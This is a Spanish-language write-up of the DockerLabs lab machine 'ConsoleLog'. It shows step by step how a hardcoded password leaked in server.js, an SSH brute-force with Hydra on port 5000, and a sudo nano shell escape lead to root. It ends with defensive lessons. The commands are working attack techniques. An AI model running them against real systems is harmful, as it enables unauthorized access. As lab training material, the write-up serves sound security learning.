# ConsoleLog — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** El Pingüino de Mario  
**Fecha de creación:** 29/07/2024  
**Técnicas:** Nmap · Gobuster · server.js con contraseña visible · Hydra SSH (puerto 5000) · nano/sudo · GTFObins

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — directorio /backend con server.js](#2-enumeración-web--directorio-backend-con-serverjs)
3. [server.js — contraseña hardcodeada visible](#3-serverjs--contraseña-hardcodeada-visible)
4. [Fuerza bruta SSH en puerto 5000 con Hydra](#4-fuerza-bruta-ssh-en-puerto-5000-con-hydra)
5. [Escalada de privilegios — nano/sudo](#5-escalada-de-privilegios--nanosudo)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

```bash
sudo bash auto_deploy.sh consolelog.tar
```

> IP asignada: `172.17.0.2`.

Escaneo inicial:

```bash
nmap -Pn 172.17.0.2
```

```
PORT     STATE SERVICE
80/tcp   open  http
3000/tcp open  ppp
5000/tcp open  upnp
```

Tres puertos. Escaneo profundo:

```bash
nmap -p80,3000,5000 -sCV -Pn 172.17.0.2
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.61 ((Debian))
|_http-title: Mi Sitio
3000/tcp open  http    Node.js Express framework
|_http-title: Error
5000/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
```

> 💡 El SSH está en el **puerto 5000** (no en el 22 habitual). Node.js Express en el 3000. Esto es intencionado para despistar.

---

## 2. Enumeración web — directorio /backend con server.js

Visitamos `http://172.17.0.2` — página de inicio sin contenido relevante. Lanzamos Gobuster:

```bash
sudo gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -u http://172.17.0.2 -x php,html,py,txt
```

```
/index.html   (Status: 200)
/backend      (Status: 301) [→ http://172.17.0.2/backend/]
/javascript   (Status: 301) [→ http://172.17.0.2/javascript/]
```

Visitamos `http://172.17.0.2/backend/` y vemos el fichero `server.js` accesible.

---

## 3. server.js — contraseña hardcodeada visible

```
http://172.17.0.2/backend/server.js
```

```javascript
const express = require('express');
const app = express();
const port = 3000;

app.use(express.json());

app.post('/recurso/', (req, res) => {
    const token = req.body.token;
    if (token === 'tokentraviesito') {
        res.send('lapassworddebackupmaschingonadetodas');
    } else {
        res.status(401).send('Unauthorized');
    }
});

app.listen(port, '0.0.0.0', () => {
    console.log(`Backend listening at http://consolelog.lab:${port}`);
});
```

> 💡 El código fuente revela dos cosas críticas: el token de autenticación **tokentraviesito** y la contraseña **lapassworddebackupmaschingonadetodas**. Esto se llama hardcoding de credenciales — una vulnerabilidad gravísima en código en producción.

---

## 4. Fuerza bruta SSH en puerto 5000 con Hydra

Con la contraseña conocida, usamos Hydra para encontrar el usuario. Usamos un diccionario de nombres comunes:

```bash
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -p lapassworddebackupmaschingonadetodas \
  ssh://172.17.0.2 -s 5000
```

```
[5000][ssh] host: 172.17.0.2   login: lovely   password: lapassworddebackupmaschingonadetodas
```

Usuario encontrado: **lovely**. Conectamos por SSH en el puerto 5000:

```bash
ssh -p 5000 lovely@172.17.0.2
```

```
lovely@172.17.0.2's password: lapassworddebackupmaschingonadetodas
lovely@47649932a794:~$
```

---

## 5. Escalada de privilegios — nano/sudo

```bash
lovely@47649932a794:~$ sudo -l
```

```
User lovely may run the following commands on 47649932a794:
    (ALL) NOPASSWD: /usr/bin/nano
```

**nano con sudo sin contraseña**. GTFObins para nano con sudo:

```bash
lovely@47649932a794:~$ sudo nano
```

Dentro de nano:
1. Presionamos `Ctrl+R` (Read File)
2. Presionamos `Ctrl+X` (Execute Command)
3. Escribimos: `reset; sh 1>&0 2>&0`
4. Enter

```
# whoami
root
```

✅ Somos **root**.

> 💡 nano permite ejecutar comandos del sistema desde su interfaz a través de la función de pipe. Al hacer `Ctrl+R, Ctrl+X` y escribir el comando, nano lo ejecuta con los privilegios con los que fue lanzado — en este caso, root.

---

## 6. Lección aprendida

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| **Fichero server.js con credenciales hardcodeadas accesible desde web** | `/backend/server.js` | Contraseña de SSH expuesta sin autenticación |
| **SSH en puerto no estándar sin otras medidas** | Puerto 5000 | Seguridad por oscuridad — no es seguridad real |
| **nano con sudo sin restricción** | `/usr/bin/nano` | Ejecución de comandos como root desde el editor |

**Para defenderse:**
- Nunca hardcodear credenciales en el código fuente. Usar variables de entorno o gestores de secretos (Vault, AWS Secrets Manager).
- Los directorios de código fuente (`/backend`, `/src`, `/api`) no deben ser accesibles desde el webroot.
- Cambiar el puerto SSH no añade seguridad real — un escaneo con Nmap lo detecta en segundos.
- Cualquier editor de texto (nano, vim, less) con sudo es una escalada garantizada vía GTFObins.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
